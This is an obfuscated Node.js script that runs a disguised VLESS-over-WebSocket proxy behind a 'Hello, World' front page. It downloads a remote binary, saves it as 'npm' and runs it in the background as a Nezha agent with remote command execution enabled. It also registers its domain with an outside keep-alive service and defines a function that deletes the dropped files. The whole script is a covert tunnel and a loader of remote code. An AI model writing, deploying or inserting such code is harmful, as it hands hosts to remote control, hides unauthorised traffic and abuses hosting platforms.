const _0x11d282=_0x2843;function _0x45fe(){const _0x32674e=['NEZHA_SERVER:\x20','\x20>/dev/null\x202>&1\x20&','arm64','from','2120705utdKil','chmod\x20+x\x20./npm','toString','SUB_PATH','utf-8','2558838hwTiDT','6tdGxDD','9960QQliQo','trim','@www.visa.com.tw:443?encryption=none&security=tls&sni=','Error\x20sending\x20request:','189JIbgae','&path=%2F#','de04add9-5c68-6bab-950c-08cd5320df33','error','buffer','npm\x20download\x20successfully','env','Vls','Hello,\x20World\x0a','decode','get','Error\x20added\x20Task:','ps\x20aux\x20|\x20grep\x20\x22npm\x22\x20|\x20grep\x20-v\x20\x22grep\x22','length','pipe','map','Not\x20Found\x0a','url','&type=ws&host=','once','sub','14pFaEaH','1234.abc.com','includes','187672qKMvVm','true','3504owtETt','\x0askip_connection_count:\x20false\x0askip_procs_count:\x20false\x0atemperature:\x20false\x0atls:\x20','base64','514776lOIHVW','URL\x20is\x20empty.\x20Skip\x20Adding\x20Automatic\x20Access\x20Task','curl\x20-s\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','replace','net','log','NEZHA_SERVER','end','DOMAIN','npm','155063EFzEFE','168kUwbtb','561lYJHty','\x20-p\x20','\x22}\x27','readUInt16BE','https://arm64.ssss.nyc.mn/v1','8443','text/plain','config.yaml','NEZHA_PORT','nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','2083','nohup\x20./npm\x20-s\x20','443','arch','\x0aclient_secret:\x20','stream','npm\x20is\x20running','createWriteStream','slice','every','--tls','vless://','Server\x20is\x20running\x20on\x20port\x20','join','axios','https://arm64.ssss.nyc.mn/agent','message','split','https://','AUTO_ACCESS','has','Automatic\x20Access\x20Task\x20added\x20successfully:','PORT','listen','readUInt8','unlink','2053','arm','concat','existsSync','finish','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','npm\x20is\x20already\x20running','data','write','http','connection','writeHead','NEZHA_KEY'];_0x45fe=function(){return _0x32674e;};return _0x45fe();}(function(_0x25ca86,_0x299a65){const _0x545885=_0x2843,_0xa45e4a=_0x25ca86();while(!![]){try{const _0x523e3e=parseInt(_0x545885(0x101))/0x1*(-parseInt(_0x545885(0xef))/0x2)+-parseInt(_0x545885(0x13d))/0x3+parseInt(_0x545885(0xf2))/0x4+-parseInt(_0x545885(0x138))/0x5*(-parseInt(_0x545885(0x13e))/0x6)+parseInt(_0x545885(0x102))/0x7*(-parseInt(_0x545885(0xf4))/0x8)+-parseInt(_0x545885(0xda))/0x9*(-parseInt(_0x545885(0x13f))/0xa)+-parseInt(_0x545885(0x103))/0xb*(-parseInt(_0x545885(0xf7))/0xc);if(_0x523e3e===_0x299a65)break;else _0xa45e4a['push'](_0xa45e4a['shift']());}catch(_0x3ced20){_0xa45e4a['push'](_0xa45e4a['shift']());}}}(_0x45fe,0xb26fa));const os=require('os'),http=require(_0x11d282(0x130)),fs=require('fs'),axios=require(_0x11d282(0x11b)),net=require(_0x11d282(0xfb)),{Buffer}=require(_0x11d282(0xde)),{exec,execSync}=require('child_process'),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x11d282(0xe0)]['UUID']||_0x11d282(0xdc),NEZHA_SERVER=process[_0x11d282(0xe0)][_0x11d282(0xfd)]||'',NEZHA_PORT=process['env'][_0x11d282(0x10b)]||'',NEZHA_KEY=process[_0x11d282(0xe0)][_0x11d282(0x133)]||'',DOMAIN=process[_0x11d282(0xe0)][_0x11d282(0xff)]||_0x11d282(0xf0),AUTO_ACCESS=process[_0x11d282(0xe0)][_0x11d282(0x120)]||!![],SUB_PATH=process[_0x11d282(0xe0)][_0x11d282(0x13b)]||_0x11d282(0xee),NAME=process['env']['NAME']||_0x11d282(0xe1),PORT=process[_0x11d282(0xe0)][_0x11d282(0x123)]||0xbb8,metaInfo=execSync(_0x11d282(0xf9),{'encoding':_0x11d282(0x13c)}),ISP=metaInfo[_0x11d282(0xd7)](),httpServer=http['createServer']((_0x3fc7d6,_0x5be646)=>{const _0x550554=_0x11d282;if(_0x3fc7d6[_0x550554(0xeb)]==='/')_0x5be646[_0x550554(0x132)](0xc8,{'Content-Type':_0x550554(0x109)}),_0x5be646[_0x550554(0xfe)](_0x550554(0xe2));else{if(_0x3fc7d6[_0x550554(0xeb)]==='/'+SUB_PATH){const _0x190be8=_0x550554(0x118)+UUID+_0x550554(0xd8)+DOMAIN+_0x550554(0xec)+DOMAIN+_0x550554(0xdb)+NAME+'-'+ISP,_0x3eb925=Buffer[_0x550554(0x137)](_0x190be8)['toString'](_0x550554(0xf6));_0x5be646[_0x550554(0x132)](0xc8,{'Content-Type':_0x550554(0x109)}),_0x5be646[_0x550554(0xfe)](_0x3eb925+'\x0a');}else _0x5be646[_0x550554(0x132)](0x194,{'Content-Type':_0x550554(0x109)}),_0x5be646['end'](_0x550554(0xea));}}),wss=new WebSocket['Server']({'server':httpServer}),uuid=UUID[_0x11d282(0xfa)](/-/g,'');wss['on'](_0x11d282(0x131),_0x2c50cd=>{const _0x59b045=_0x11d282;_0x2c50cd[_0x59b045(0xed)](_0x59b045(0x11d),_0x2d2d2b=>{const _0xd64447=_0x59b045,[_0x572baa]=_0x2d2d2b,_0x55dee8=_0x2d2d2b[_0xd64447(0x115)](0x1,0x11);if(!_0x55dee8[_0xd64447(0x116)]((_0x5d835b,_0x2771e8)=>_0x5d835b==parseInt(uuid['substr'](_0x2771e8*0x2,0x2),0x10)))return;let _0x12e5a2=_0x2d2d2b[_0xd64447(0x115)](0x11,0x12)['readUInt8']()+0x13;const _0x567e33=_0x2d2d2b[_0xd64447(0x115)](_0x12e5a2,_0x12e5a2+=0x2)['readUInt16BE'](0x0),_0x4dc73b=_0x2d2d2b[_0xd64447(0x115)](_0x12e5a2,_0x12e5a2+=0x1)[_0xd64447(0x125)](),_0x452058=_0x4dc73b==0x1?_0x2d2d2b['slice'](_0x12e5a2,_0x12e5a2+=0x4)[_0xd64447(0x11a)]('.'):_0x4dc73b==0x2?new TextDecoder()[_0xd64447(0xe3)](_0x2d2d2b[_0xd64447(0x115)](_0x12e5a2+0x1,_0x12e5a2+=0x1+_0x2d2d2b[_0xd64447(0x115)](_0x12e5a2,_0x12e5a2+0x1)[_0xd64447(0x125)]())):_0x4dc73b==0x3?_0x2d2d2b[_0xd64447(0x115)](_0x12e5a2,_0x12e5a2+=0x10)['reduce']((_0x510522,_0x3fd5f8,_0x1baa70,_0x44c53e)=>_0x1baa70%0x2?_0x510522[_0xd64447(0x129)](_0x44c53e['slice'](_0x1baa70-0x1,_0x1baa70+0x1)):_0x510522,[])[_0xd64447(0xe9)](_0x589b0e=>_0x589b0e[_0xd64447(0x106)](0x0)[_0xd64447(0x13a)](0x10))[_0xd64447(0x11a)](':'):'';_0x2c50cd['send'](new Uint8Array([_0x572baa,0x0]));const _0xdbabc3=createWebSocketStream(_0x2c50cd);net['connect']({'host':_0x452058,'port':_0x567e33},function(){const _0x28a555=_0xd64447;this[_0x28a555(0x12f)](_0x2d2d2b['slice'](_0x12e5a2)),_0xdbabc3['on']('error',()=>{})[_0x28a555(0xe8)](this)['on'](_0x28a555(0xdd),()=>{})[_0x28a555(0xe8)](_0xdbabc3);})['on'](_0xd64447(0xdd),()=>{});})['on'](_0x59b045(0xdd),()=>{});});const getDownloadUrl=()=>{const _0x467fd6=_0x11d282,_0x7f1fd0=os[_0x467fd6(0x110)]();return _0x7f1fd0===_0x467fd6(0x128)||_0x7f1fd0===_0x467fd6(0x136)||_0x7f1fd0==='aarch64'?!NEZHA_PORT?_0x467fd6(0x107):_0x467fd6(0x11c):!NEZHA_PORT?'https://amd64.ssss.nyc.mn/v1':'https://amd64.ssss.nyc.mn/agent';},downloadFile=async()=>{const _0x1103c6=_0x11d282;try{const _0x4650f6=getDownloadUrl(),_0x2a69db=await axios({'method':_0x1103c6(0xe4),'url':_0x4650f6,'responseType':_0x1103c6(0x112)}),_0x361230=fs[_0x1103c6(0x114)](_0x1103c6(0x100));return _0x2a69db[_0x1103c6(0x12e)][_0x1103c6(0xe8)](_0x361230),new Promise((_0x103552,_0x5a4ac1)=>{const _0x4c036a=_0x1103c6;_0x361230['on'](_0x4c036a(0x12b),()=>{const _0x3cea9d=_0x4c036a;console['log'](_0x3cea9d(0xdf)),exec(_0x3cea9d(0x139),_0x305c9e=>{if(_0x305c9e)_0x5a4ac1(_0x305c9e);_0x103552();});}),_0x361230['on'](_0x4c036a(0xdd),_0x5a4ac1);});}catch(_0x4f9f26){throw _0x4f9f26;}},runnz=async()=>{const _0x13d70a=_0x11d282;await downloadFile();let _0x1bd739='',_0x383028='';console[_0x13d70a(0xfc)](_0x13d70a(0x134)+NEZHA_SERVER);const _0x3a7930=()=>{const _0xb9a6ea=_0x13d70a;try{const _0xc17ed5=execSync(_0xb9a6ea(0xe6))[_0xb9a6ea(0x13a)]();return _0xc17ed5[_0xb9a6ea(0xe7)]>0x0;}catch(_0x2ee5c6){return![];}};if(_0x3a7930()){console[_0x13d70a(0xfc)](_0x13d70a(0x12d));return;}if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x10cafd=['443',_0x13d70a(0x108),'2096','2087',_0x13d70a(0x10d),_0x13d70a(0x127)];_0x1bd739=_0x10cafd[_0x13d70a(0xf1)](NEZHA_PORT)?_0x13d70a(0x117):'',_0x383028=_0x13d70a(0x10e)+NEZHA_SERVER+':'+NEZHA_PORT+_0x13d70a(0x104)+NEZHA_KEY+'\x20'+_0x1bd739+_0x13d70a(0x135);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x3552e7=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x13d70a(0x11e)](':')['pop']():'',_0x1fd869=new Set([_0x13d70a(0x10f),_0x13d70a(0x108),'2096','2087',_0x13d70a(0x10d),_0x13d70a(0x127)]),_0x429650=_0x1fd869[_0x13d70a(0x121)](_0x3552e7)?_0x13d70a(0xf3):'false',_0xdfba41=_0x13d70a(0x111)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20false\x0aip_report_period:\x201800\x0areport_delay:\x201\x0aserver:\x20'+NEZHA_SERVER+_0x13d70a(0xf5)+_0x429650+_0x13d70a(0x12c)+UUID;!fs[_0x13d70a(0x12a)](_0x13d70a(0x10a))&&fs['writeFileSync'](_0x13d70a(0x10a),_0xdfba41);}_0x383028=_0x13d70a(0x10c);}else{console[_0x13d70a(0xfc)]('NEZHA\x20variable\x20is\x20empty,\x20skip\x20running');return;}}try{exec(_0x383028,{'shell':'/bin/bash'}),console['log'](_0x13d70a(0x113));}catch(_0x276164){console[_0x13d70a(0xdd)]('npm\x20running\x20error:\x20'+_0x276164);}};function _0x2843(_0xfbbe68,_0x47aa1e){const _0x45fed2=_0x45fe();return _0x2843=function(_0x2843eb,_0x36867a){_0x2843eb=_0x2843eb-0xd7;let _0x1de80a=_0x45fed2[_0x2843eb];return _0x1de80a;},_0x2843(_0xfbbe68,_0x47aa1e);}async function addAccessTask(){const _0x108524=_0x11d282;if(!AUTO_ACCESS)return;try{if(!DOMAIN){console['log'](_0x108524(0xf8));return;}else{const _0x10ede1=_0x108524(0x11f)+DOMAIN,_0x51f61e='curl\x20-X\x20POST\x20\x22https://oooo.serv00.net/add-url\x22\x20-H\x20\x22Content-Type:\x20application/json\x22\x20-d\x20\x27{\x22url\x22:\x20\x22'+_0x10ede1+_0x108524(0x105);exec(_0x51f61e,(_0x346c33,_0x878f36,_0x6af63f)=>{const _0x22ff5e=_0x108524;if(_0x346c33){console[_0x22ff5e(0xdd)](_0x22ff5e(0xd9),_0x346c33[_0x22ff5e(0x11d)]);return;}console['log'](_0x22ff5e(0x122),_0x878f36);});}}catch(_0x3e2d61){console['error'](_0x108524(0xe5),_0x3e2d61[_0x108524(0x11d)]);}}const delFiles=()=>{const _0x50eec5=_0x11d282;fs[_0x50eec5(0x126)](_0x50eec5(0x100),()=>{}),fs[_0x50eec5(0x126)]('config.yaml',()=>{});};httpServer[_0x11d282(0x124)](PORT,()=>{const _0x3c6451=_0x11d282;runnz(),addAccessTask(),console[_0x3c6451(0xfc)](_0x3c6451(0x119)+PORT);});